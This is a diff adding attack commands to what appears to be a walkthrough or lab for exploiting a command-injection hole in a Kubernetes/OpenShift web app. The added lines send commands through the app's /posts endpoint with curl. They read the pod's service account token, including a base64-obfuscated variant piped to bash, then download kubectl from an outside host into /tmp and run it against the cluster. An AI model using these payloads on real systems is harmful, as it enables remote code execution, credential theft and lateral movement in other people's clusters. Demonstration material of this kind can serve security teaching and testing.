@@ -46,3 +46,20 @@ curl -X POST -d "cmd=${cmd}" "http://$(oc -n frontend get route/webapp --output 
 
 exploit is not enabled
 ```
+
+
+export cmd='token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) && echo $token'
+
+export cmd='echo dG9rZW49JChjYXQgL3J1bi9zZWNyZXRzL2t1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvdG9rZW4pICYmIGVjaG8gJHRva2VuCg== | base64 -d | bash -'
+
+# Get visa-token
+curl -X POST -d "cmd=cat /run/secrets/kubernetes.io/serviceaccount/token > /tmp/token" "http://$(oc -n frontend get route/webapp --output jsonpath={.spec.host})"/posts
+
+# Download kubectl
+curl -X POST -d "cmd=curl -L -o /tmp/kubectl https://dl.k8s.io/release/v1.27.2/bin/linux/amd64/kubectl" "http://$(oc -n frontend get route/webapp --output jsonpath={.spec.host})"/posts
+
+# chmod +x kubectl
+curl -X POST -d "cmd=chmod +x /tmp/kubectl" "http://$(oc -n frontend get route/webapp --output jsonpath={.spec.host})"/posts
+
+
+command='curl -L -o /tmp/kubectl https://dl.k8s.io/release/v1.27.2/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl && /tmp/kubectl get pods'
